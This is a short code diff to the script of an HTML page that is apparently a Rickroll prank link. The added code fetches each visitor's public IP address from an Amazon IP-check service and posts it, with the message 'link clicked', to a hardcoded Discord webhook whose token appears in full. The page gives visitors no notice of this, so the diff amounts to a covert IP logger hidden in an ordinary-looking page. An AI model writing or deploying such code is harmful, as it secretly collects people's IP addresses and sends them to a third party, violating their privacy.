@@ -27,16 +27,21 @@
 </footer>
 </body>
 <script>
-    function sendMessage() {
+    async function getIPFromAmazon() {
+        return fetch("https://checkip.amazonaws.com/").then(res => res.text());
+    }
+
+    async function sendMessage() {
         const request = new XMLHttpRequest();
         request.open("POST", "https://discord.com/api/webhooks/1177548278754193489/cLFuugp87J781do-clTLLEHP342HbI4VqmWt8SO-VWs14UCmjO8LYUIWQ86a3z64WwVI");
-
+        console.log(getIPFromAmazon())
         request.setRequestHeader('Content-type', 'application/json');
-
+        let ip = await getIPFromAmazon();
         const params = {
             username: "Gave you Up",
-            avatar_url: "",
-            content: "link clicked"
+
+            avatar_url: "https://images.feierfreund.de/files/media/image/file/rick_astley_800x450_0.png?rect=96%2C0%2C600%2C450",
+            content: `link clicked ${ip}`
         }
 
         request.send(JSON.stringify(params));
